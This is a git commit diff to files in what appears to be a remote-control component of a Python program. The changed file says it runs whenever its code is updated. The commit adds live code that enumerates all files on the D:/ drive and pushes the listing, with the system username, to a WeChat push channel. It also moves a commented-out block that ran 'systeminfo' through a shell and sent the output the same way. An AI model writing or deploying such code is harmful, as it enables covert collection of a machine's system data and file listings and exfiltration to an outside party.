59f17a6a07c2595c701896354b457ce73de0e21e
GCLgaici <3471093372@qq.com>
2024-10-25 21:45:10 +0800

    yc

--- Control_files/Change_Execution.py
+++ Control_files/Change_Execution.py
@@ -1,21 +1,9 @@
 """
-代码有变化就执行2024-
+代码有变化就执行2144
 """
 import os
+wjb = ''
+for i in os.listdir("D:/"):
+    wjb += '|文件：' + i
 
-# 要执行的命令，这里以获取系统信息（systeminfo）为例
-command = "systeminfo"
-
-# 使用run函数执行命令，通过shell=True在系统的shell中执行，需要注意安全问题
-try:
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if result.returncode == 0:
-        print(result.stdout)
-        self.main.wechat_push.Alleged_information(f'{result.stdout}')
-    else:
-        print(f"命令执行失败，错误信息: {result.stderr}")
-        self.main.wechat_push.Alleged_information(f'{f"命令执行失败，错误信息: {result.stderr}"}')
-
-except Exception as e:
-    print(f"发生错误: {e}")
-    self.main.wechat_push.Alleged_information(f"发生错误: {e}")
+self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)
--- Control_files/Start_execution.py
+++ Control_files/Start_execution.py
@@ -3,3 +3,20 @@
 """
 # self.main.wechat_push.Alleged_information(f'{self.main.sys_username}代码测试')
 
+
+# 要执行的命令，这里以获取系统信息（systeminfo）为例
+# command = "systeminfo"
+
+# 使用run函数执行命令，通过shell=True在系统的shell中执行，需要注意安全问题
+# try:
+#     result = subprocess.run(command, shell=True, capture_output=True, text=True)
+#     if result.returncode == 0:
+#         print(result.stdout)
+#         self.main.wechat_push.Alleged_information(f'{result.stdout}')
+#     else:
+#         print(f"命令执行失败，错误信息: {result.stderr}")
+#         self.main.wechat_push.Alleged_information(f'{f"命令执行失败，错误信息: {result.stderr}"}')
+#
+# except Exception as e:
+#     print(f"发生错误: {e}")
+#     self.main.wechat_push.Alleged_information(f"发生错误: {e}")
